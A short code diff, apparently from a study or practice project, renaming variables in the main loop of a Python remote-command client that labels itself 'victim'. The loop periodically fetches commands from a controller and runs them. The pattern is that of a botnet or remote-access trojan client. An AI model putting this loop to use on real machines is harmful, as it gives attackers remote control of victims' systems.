@@ -12,10 +12,10 @@ from controllers.CommandFactory import CommandFactory
 
 if __name__ == '__main__':
     print("I'm a victim!")
-    command_obj = CommandFactory()
+    command_factory = CommandFactory()
     while True:
         time.sleep(Timer.get_seconds())
-        data = c.get_commands()
+        command_list = c.get_commands()
 
-        for com in data:
-            print(command_obj.create_command(com["com"], com["params"]).run())
+        for com in command_list:
+            print(command_factory.create_command(com["com"], com["params"]).run())
